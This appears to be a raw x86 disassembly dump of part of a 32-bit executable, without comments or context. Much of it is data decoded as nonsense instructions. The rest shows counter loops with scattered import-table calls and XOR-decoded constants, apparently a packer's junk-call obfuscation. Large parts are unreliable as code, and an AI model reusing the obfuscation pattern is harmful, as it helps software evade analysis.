  403127:	add    esp,DWORD PTR [ebx-0x48246b13]
  40312d:	ja     0x403159
  40312f:	rcr    BYTE PTR [eax],1
  403131:	push   ebp
  403132:	xchg   BYTE PTR [eax],dl
  403134:	jae    0x40311a
  403136:	pop    ds
  403137:	test   eax,0xb921c9c5
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx-0x674c3ea4],0x8e
  40315f:	push   esp
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x4031c0
  403169:	xchg   ecx,eax
  40316a:	inc    ebx
  40316b:	jnp    0x40316f
  40316d:	fdivr  st,st(6)
  40316f:	jmp    0x4031d5
  403171:	in     eax,dx
  403172:	pop    esp
  403173:	add    BYTE PTR [eax],cl
  403175:	and    BYTE PTR [ecx+0x32],0x0
  403179:	fmul   st(5),st
  40317b:	clc    
  40317c:	inc    esi
  40317d:	clc    
  40317e:	jo     0x40310f
  403180:	jge    0x4031b0
  403182:	adc    DWORD PTR [ebx-0x71],esp
  403185:	ret    
  403186:	addr16 test al,cl
  403189:	mov    eax,ds:0xa0063d97
  40318e:	jae    0x4031bd
  403190:	mov    dh,BYTE PTR [eax+0x73c81458]
  403196:	jecxz  0x4031d7
  403198:	lea    ebx,[eax+0x24]
  40319b:	pop    ss
  40319c:	adc    BYTE PTR [eax-0x6],dl
  40319f:	pusha  
  4031a0:	(bad)  [ecx+0x2f]
  4031a3:	mov    ah,0xd2
  4031a5:	retf   0x5bf6
  4031a8:	lds    ecx,FWORD PTR [esi+0x1acaa2c9]
  4031ae:	fadd   QWORD PTR ds:[eax+0x3bfc18aa]
  4031b5:	popf   
  4031b6:	call   0xb4badfa8
  4031bb:	jp     0x403204
  4031bd:	push   esp
  4031be:	mov    eax,0x6d102a32
  4031c3:	inc    edi
  4031c4:	rcr    esp,1
  4031c6:	xchg   esp,eax
  4031c7:	and    ebp,edi
  4031c9:	bound  ecx,QWORD PTR [edx]
  4031cb:	leave  
  4031cc:	mov    dl,BYTE PTR [ecx]
  4031ce:	fimul  WORD PTR [ebp+0x4f579621]
  4031d4:	stc    
  4031d5:	mov    bh,0x17
  4031d7:	enter  0xb03d,0x6b
  4031db:	jg     0x40317d
  4031dd:	fwait
  4031de:	repnz stos DWORD PTR es:[edi],eax
  4031e0:	and    BYTE PTR [ecx-0x41fc69b4],dl
  4031e6:	jo     0x40324e
  4031e8:	ret    0x443
  4031eb:	sti    
  4031ec:	cdq    
  4031ed:	fld    DWORD PTR [edx]
  4031ef:	cli    
  4031f0:	jns    0x40318d
  4031f2:	sbb    DWORD PTR [eax],edi
  4031f4:	sahf   
  4031f5:	sbb    edx,0x28
  4031f8:	dec    eax
  4031f9:	jb     0x40319c
  4031fb:	std    
  4031fc:	sar    BYTE PTR [edi+0x3],cl
  4031ff:	hlt    
  403200:	sub    eax,0xed1ad42b
  403205:	dec    esi
  403206:	(bad)  
  403207:	and    BYTE PTR [edx+0x35d09694],dh
  40320d:	or     BYTE PTR [esi+edx*8],bh
  403210:	jnp    0x4031dc
  403212:	mov    dl,0xdd
  403214:	xor    BYTE PTR [ebx-0x1b],bl
  403217:	lds    ecx,FWORD PTR [ecx+0x1]
  40321a:	mov    ebx,0xb8d960d3
  40321f:	jbe    0x4031ed
  403221:	mov    edx,0xc7c8560e
  403226:	bound  edx,QWORD PTR [esi-0x15b83185]
  40322c:	mov    eax,0xc3284190
  403231:	lods   eax,DWORD PTR ds:[esi]
  403232:	cmp    BYTE PTR [ecx+eax*4-0xa5a4751],dh
  403239:	neg    DWORD PTR [ebp-0x705c7363]
  40323f:	push   ecx
  403240:	pop    edi
  403241:	mov    WORD PTR [edi],es
  403243:	sub    edi,ebp
  403245:	xor    esi,esi
  403247:	pop    esi
  403248:	jmp    0x1ba7:0xa3f9da2c
  40324f:	sti    
  403250:	jg     0x40327d
  403252:	rol    BYTE PTR [eax+0x2123d519],1
  403258:	jne    0x40328d
  40325a:	pop    es
  40325b:	push   DWORD PTR [edx+0x42ceb843]
  403261:	mov    ds:0x3a4f555a,al
  403266:	xchg   edi,eax
  403267:	cmp    ch,0xdc
  40326a:	push   eax
  40326b:	out    dx,al
  40326c:	or     DWORD PTR [ecx+0x54],ebx
  40326f:	(bad)
  403272:	mov    bl,0x1c
  403274:	aad    0x17
  403276:	lods   al,BYTE PTR ds:[esi]
  403277:	inc    edx
  403278:	sub    BYTE PTR [ebp-0x26ca585],cl
  40327e:	push   ebx
  40327f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403280:	shl    BYTE PTR ss:[ecx+0x4ec12ad4],cl
  403287:	ret    0x1091
  40328a:	xchg   edi,eax
  40328b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40328c:	mov    bl,0x5b
  40328e:	xor    dl,al
  403290:	push   esi
  403291:	mov    edi,DWORD PTR [esi]
  403293:	(bad)  [edx-0x32]
  403296:	and    dh,ch
  403298:	jbe    0x403266
  40329a:	es in  eax,dx
  40329c:	cld    
  40329d:	ss scas eax,DWORD PTR es:[edi]
  40329f:	inc    ecx
  4032a0:	iret   
  4032a1:	pop    ebx
  4032a2:	mov    edx,0x5d6f3bfe
  4032a7:	shl    BYTE PTR [ecx+0x23],cl
  4032aa:	push   esp
  4032ab:	mov    eax,gs
  4032ad:	cmp    BYTE PTR [ebx+0x5a],dh
  4032b0:	out    0xac,eax
  4032b2:	or     dl,dl
  4032b4:	xchg   ebp,eax
  4032b5:	ins    BYTE PTR es:[edi],dx
  4032b6:	cli    
  4032b7:	shl    BYTE PTR [ebp+0x25],cl
  4032ba:	pop    eax
  4032bb:	inc    esi
  4032bc:	cld    
  4032bd:	mov    ebp,0x92271856
  4032c2:	jae    0x40330e
  4032c4:	pop    ecx
  4032c5:	and    DWORD PTR [ebp+0x3c2a02ce],eax
  4032cb:	mov    WORD PTR [ecx+0x38],?
  4032ce:	sbb    BYTE PTR [esi],dh
  4032d0:	xor    edi,DWORD PTR [esi-0x4f]
  4032d3:	popa   
  4032d4:	ds pop edi
  4032d6:	sbb    ebx,DWORD PTR [esi+0xeadf0cf]
  4032dc:	(bad)
  4032e0:	xor    BYTE PTR [edx+eax*4-0x62],ah
  4032e4:	pusha  
  4032e5:	xchg   ebx,eax
  4032e6:	loop   0x403321
  4032e8:	addr16 jb 0x4032fc
  4032eb:	dec    ecx
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43375b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43375b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43375b,ecx
  40331d:	cmp    DWORD PTR ds:0x43375b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43375b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4337ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4337d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43371f
  40336b:	add    DWORD PTR ds:0x433703,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433757,0x1e
  40338b:	cmp    DWORD PTR ds:0x433757,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433757,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433757,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433757
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433757,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433757
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433757,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4337e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433747
  4033f2:	mov    edi,DWORD PTR ds:0x433787
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433767,0x1c
  40340f:	cmp    DWORD PTR ds:0x433767,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433767,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433767,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433767
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433767,edi
  40344c:	mov    edi,DWORD PTR ds:0x433767
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433767,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4337e3
  403467:	and    edx,DWORD PTR ds:0x433817
  40346d:	mov    DWORD PTR ds:0x4337e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43379b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43381f
  40349f:	adc    DWORD PTR ds:0x4336ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433817,0x10
  4034c6:	cmp    DWORD PTR ds:0x433817,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433817,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433817,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433817
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433817,edi
  403505:	mov    edi,DWORD PTR ds:0x433817
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433817,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43382b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x762ad48a]
  403537:	xor    DWORD PTR [ebx+0x7e7e15c6],ebp
  40353d:	pop    eax
  40353e:	jl     0x4035be
  403540:	jle    0x4035c0
  403542:	xor    dh,BYTE PTR [eax+0x67]
  403545:	push   ebp
  403546:	xchg   edx,eax
  403547:	and    ch,BYTE PTR [edx]
  403549:	fyl2x  
  40354b:	shl    BYTE PTR [esi],1
  40354d:	jecxz  0x403588
  40354f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403550:	fs dec ecx
  403552:	std    
  403553:	dec    edx
  403554:	xor    dh,ah
  403556:	cmp    eax,0x478d3019
  40355b:	mov    eax,ds:0xa9fdcc3b
  403560:	sub    ch,BYTE PTR [esi-0x7d]
  403563:	adc    DWORD PTR [edi],0xe3fa787f
  403569:	call   0xeda17af
  40356e:	mov    dh,0xd8
  403570:	jecxz  0x4034f3
  403572:	rcr    BYTE PTR [esi],cl
  403574:	sbb    al,dl
  403576:	out    0x66,eax
  403578:	sub    al,0xd9
  40357a:	test   DWORD PTR [eax-0x1bd9454c],eax
  403580:	(bad)  
  403582:	bound  edx,QWORD PTR [esi]
  403584:	or     ebp,ebx
  403586:	mov    dl,0xe9
  403588:	out    dx,al
  403589:	fsub   DWORD PTR [ecx+0x34b3f3a5]
  40358f:	dec    edx
  403590:	test   al,0x89
  403592:	dec    edx
  403593:	xor    eax,ecx
  403595:	mov    WORD PTR [ecx+esi*4+0x4],es
  403599:	add    esi,DWORD PTR [edx+0x5e]
  40359c:	inc    edi
  40359d:	push   ebp
  40359e:	in     eax,0x1
  4035a0:	es jo  0x4035e7
  4035a3:	mov    DWORD PTR [esp+eax*1-0x2a],edi
  4035a7:	sbb    esi,esp
  4035a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035aa:	pop    es
  4035ab:	mov    cl,0x6d
  4035ad:	cmp    DWORD PTR [esi+0x48],edx
  4035b0:	adc    DWORD PTR [ebx+0x60],ecx
  4035b3:	rcl    BYTE PTR [esi+0x1ed9ff9],cl
  4035b9:	mov    edi,0x9e9f189
  4035be:	inc    ebp
  4035bf:	adc    DWORD PTR [esi+0x2ce53b15],ecx
  4035c5:	repz fwait
  4035c7:	sub    DWORD PTR [ebp+0x5bc758f7],0xffffffef
  4035ce:	pop    es
  4035cf:	shr    DWORD PTR [ebx-0x4bad3cb3],cl
  4035d5:	sbb    al,0x78
  4035d7:	pop    ebx
  4035d8:	xchg   esp,eax
  4035d9:	mov    eax,0xab83d3af
  4035de:	push   eax
  4035df:	(bad)  
  4035e0:	outs   dx,DWORD PTR ds:[esi]
  4035e1:	cmp    ah,BYTE PTR [esi-0x4d679014]
  4035e7:	shl    DWORD PTR [edx-0xfe770b8],0x3f
  4035ee:	nop
  4035ef:	jae    0x4035e3
  4035f1:	aam    0xa3
  4035f3:	mov    edi,0x4289bdba
  4035f8:	sti    
  4035f9:	(bad)  
  4035fa:	(bad)  
  4035fb:	jl     0x403611
  4035fd:	clc    
  4035fe:	adc    BYTE PTR [ebp-0x65f01d87],cl
  403604:	push   ebx
  403605:	xchg   esi,eax
  403606:	rcl    DWORD PTR [eax],0x0
  403609:	push   edi
  40360a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40360b:	addr16 ret 
  40360d:	adc    ah,BYTE PTR [edx+0x273c2def]
  403613:	mov    ebx,0x20a61e38
  403618:	sbb    DWORD PTR [edx+0x2c2bd1c7],eax
  40361e:	ret    
  40361f:	fadd   QWORD PTR ds:0x76cedf1b
  403625:	(bad)  
  403626:	push   eax
  403627:	mov    esp,0x9123de41
  40362c:	ret    
  40362d:	dec    DWORD PTR [esi+ebx*4]
  403630:	popf   
  403631:	sbb    al,0x6b
  403633:	sbb    edx,DWORD PTR ds:0xec70b9fd
  403639:	xchg   edx,eax
  40363a:	or     eax,0xb0755e5f
  40363f:	call   0xf533:0x820075e9
  403646:	scas   al,BYTE PTR es:[edi]
  403647:	data16 hlt 
  403649:	call   0x3d16:0xbcfe77c6
  403650:	ins    DWORD PTR es:[edi],dx
  403651:	dec    edi
  403652:	ret    
  403653:	adc    al,BYTE PTR [eax]
  403655:	scas   eax,DWORD PTR es:[edi]
  403656:	ds clc 
  403658:	pop    edi
  403659:	or     bl,BYTE PTR [eax+eiz*2+0x7d8d1ce5]
  403660:	pop    esi
  403661:	xchg   esp,eax
  403662:	jns    0x4036c4
  403664:	jecxz  0x4036cc
  403666:	dec    eax
  403667:	adc    esi,DWORD PTR [edx+0x6833bc66]
  40366d:	fsub   DWORD PTR [esi+0x2b]
  403670:	jno    0x40365a
  403672:	mov    esi,0xf76d1eb
  403677:	push   ebp
  403678:	repz mov ecx,0x8c52a303
  40367e:	xor    di,WORD PTR ds:0x4b77d742
  403685:	push   es
  403686:	int3   
  403687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403688:	int    0x52
  40368a:	adc    ecx,DWORD PTR [ecx+eax*4]
  40368d:	retf   
  40368e:	mov    dl,0xd3
  403690:	push   ds
  403691:	repnz inc ebx
  403693:	dec    esi
  403694:	and    bh,bh
  403696:	int3   
  403697:	xor    edi,DWORD PTR [ecx]
  403699:	nop
  40369a:	(bad)  
  40369b:	je     0x40364a
  40369d:	das    
  40369e:	mov    dh,BYTE PTR [edx-0x53]
  4036a1:	rol    DWORD PTR [edx-0x4d],cl
  4036a4:	add    BYTE PTR [eax+ecx*1-0x5f00f751],bl
  4036ab:	pop    edx
  4036ac:	(bad)  
  4036ad:	adc    DWORD PTR ds:0x84fdeb36,0x3a
  4036b4:	cmp    bh,BYTE PTR [ebx]
  4036b6:	sub    DWORD PTR [eax+esi*8],esp
  4036b9:	xchg   ebp,eax
  4036ba:	daa    
  4036bb:	add    BYTE PTR [esi+0x43f7b823],cl
  4036c1:	(bad)  
  4036c2:	fcmovnbe st,st(6)
  4036c4:	icebp  
  4036c5:	xchg   esp,eax
  4036c6:	and    bh,al
  4036c8:	sub    BYTE PTR [edi-0x5f142af5],dl
  4036ce:	jmp    0x403721
  4036d0:	ins    BYTE PTR es:[edi],dx
  4036d1:	lods   eax,DWORD PTR cs:[esi]
  4036d3:	lods   eax,DWORD PTR ds:[esi]
  4036d4:	in     al,0x28
  4036d6:	call   0xdc416daf
  4036db:	pop    ds
  4036dc:	loop   0x40365e
  4036de:	leave  
  4036df:	lods   al,BYTE PTR ds:[esi]
  4036e0:	and    al,0x11
  4036e2:	ds xchg edx,eax
  4036e4:	sbb    al,0x2a
  4036e6:	mov    WORD PTR [ebx+0x12],es
  4036e9:	mov    ds:0x3eb288d2,eax
  4036ee:	pop    esi
  4036ef:	jbe    0x40367d
  4036f1:	xor    al,0xbb
  4036f3:	jmp    0x40368f
  4036f5:	sub    esp,DWORD PTR [ebp-0x45262fb5]
  4036fb:	cdq    
  4036fc:	data16 (bad) 
  4036fe:	mov    edi,0x867ea316
  403703:	mov    eax,0x2f9c4fea
  403708:	cld    
  403709:	fadd   DWORD PTR [esi]
  40370b:	rol    BYTE PTR [ecx],cl
  40370d:	in     al,dx
  40370e:	cmp    al,dl
  403710:	jp     0x403735
  403712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403713:	aaa    
  403714:	dec    eax
  403715:	jns    0x4036e7
  403717:	xchg   edx,eax
  403718:	retf   0x50e7
  40371b:	out    dx,al
  40371c:	cmp    al,0x53
  40371e:	add    eax,edx
  403720:	jmp    0x4036a2
  403722:	sbb    al,0x31
  403724:	ins    DWORD PTR es:[edi],dx
  403725:	adc    BYTE PTR [edi+ebp*1],dl
  403728:	mov    ds:0x3e23ac5c,al
  40372d:	or     ebp,DWORD PTR [eax+eiz*2-0x23]
  403731:	out    dx,al
  403732:	mov    al,ds:0xb841298f
  403737:	dec    BYTE PTR [esi-0x20]
  40373a:	pop    esp
  40373b:	data16 sti 
  40373d:	jecxz  0x403756
  40373f:	xchg   esp,eax
  403740:	loope  0x4036c3
  403742:	ret    
  403743:	pop    edx
  403744:	xor    eax,0xa3f29c51
  403749:	outs   dx,DWORD PTR ds:[esi]
  40374a:	jo     0x4036f0
  40374c:	jle    0x4036dc
  40374e:	ss fdivp st(4),st
  403751:	inc    eax
  403752:	sub    eax,0xeb616eb1
  403757:	lahf   
  403758:	push   0xffffffdc
  40375a:	retf   
  40375b:	adc    BYTE PTR [ecx-0x6bbeff86],cl
  403761:	pushf  
  403762:	lods   al,BYTE PTR ds:[esi]
  403763:	shr    DWORD PTR [esi+0x563e4caf],1
  403769:	sub    eax,0x1ad27992
  40376e:	sub    DWORD PTR [ebx+0x69ede058],edi
  403774:	loop   0x403719
  403776:	dec    esp
  403777:	adc    eax,0xad8aa4e8
  40377c:	dec    eax
  40377d:	pop    esi
  40377e:	ret    0xb603
  403781:	lods   al,BYTE PTR ds:[esi]
  403782:	lock popa 
  403784:	and    bl,BYTE PTR [esi+0xa305f7c]
  40378a:	scas   eax,DWORD PTR es:[edi]
  40378b:	mov    al,0x22
  40378d:	mov    ecx,0x9bb489e5
  403792:	mov    dh,0x58
  403794:	pop    esp
  403795:	adc    al,0x20
  403797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403798:	push   eax
  403799:	xchg   esp,eax
  40379a:	inc    esi
  40379b:	lods   al,BYTE PTR ds:[esi]
  40379c:	neg    DWORD PTR [ebp+0x20]
  40379f:	call   0xd9ec18b4
  4037a4:	mov    eax,ds:0x40969d21
  4037a9:	(bad)  
  4037ab:	(bad)  
  4037ad:	(bad)  
  4037ae:	stc    
  4037af:	jmp    0xf985:0xa39b0d
  4037b6:	push   edi
  4037b7:	(bad)  
  4037b8:	or     ebx,DWORD PTR [esi]
  4037ba:	adc    ch,BYTE PTR ds:0x97e0e85c
  4037c0:	mov    ebp,0xbdecab75
  4037c5:	mov    edx,0xbaf8556f
  4037ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037cb:	sbb    al,0x73
  4037cd:	(bad)  
  4037ce:	aas    
  4037cf:	push   0x76
  4037d1:	jo     0x40375f
  4037d3:	xchg   BYTE PTR [eax-0x13],bh
  4037d6:	leave  
  4037d7:	xor    BYTE PTR [edx-0x4f],0x83
  4037db:	mov    es,WORD PTR [ecx-0xb]
  4037de:	xor    DWORD PTR [esi+0x3f],ecx
  4037e1:	daa    
  4037e2:	mov    esi,eax
  4037e4:	popa   
  4037e5:	in     eax,0xee
  4037e7:	ds mov esp,0x14e0f055
  4037ed:	dec    edi
  4037ee:	or     esp,edx
  4037f0:	push   edi
  4037f1:	jno    0x40383b
  4037f3:	mov    bh,0x41
  4037f5:	xchg   ebp,eax
  4037f6:	xchg   al,bh
  4037f8:	and    eax,0xf2c7147
  4037fd:	rol    ch,1
  4037ff:	pop    ds
  403800:	popa   
  403801:	or     DWORD PTR [ecx-0x42689444],esi
  403807:	rcr    DWORD PTR [edi],1
  403809:	cmp    al,0xc3
  40380b:	dec    edi
  40380c:	sahf   
  40380d:	push   esi
  40380e:	dec    ebx
  40380f:	mov    bh,0x33
  403811:	and    BYTE PTR [esi],ch
  403813:	les    edi,FWORD PTR [edi+0x74]
  403816:	mov    WORD PTR [ebp+0x5256e258],cs
  40381c:	int    0x96
  40381e:	outs   dx,DWORD PTR ds:[esi]
  40381f:	bswap  ebp
  403821:	ret    0x52a8
  403824:	sahf   
  403825:	in     eax,0x97
  403827:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40382e:	sbb    edi,DWORD PTR ds:0x4336fb
  403834:	mov    edx,DWORD PTR [ebp+0x8]
  403837:	sbb    edi,DWORD PTR ds:0x4337ab
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x433827,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x433827
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433827,edi
  403858:	cmp    DWORD PTR ds:0x433827,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433827,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433827
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433827,edi
  40389c:	cmp    DWORD PTR ds:0x433827,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43376b,0x43382b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433793,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4337eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433827,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4337eb,0x4337ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4336fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433717,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433713,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43381b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4336ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4336ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4336ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4336ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4336ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4336ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4336ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4336ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433767
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433713
  4039a6:	sub    edi,DWORD PTR ds:0x433823
  4039ac:	mov    DWORD PTR ds:0x433713,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433707,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433707,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433707,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433707
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433707,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433717
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4336fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4336fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4336fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4336fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4336fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4337d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4337d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4337d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4337d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4337d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43381b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403b2e
  403acb:	iret   
  403acc:	push   esi
  403acd:	push   es
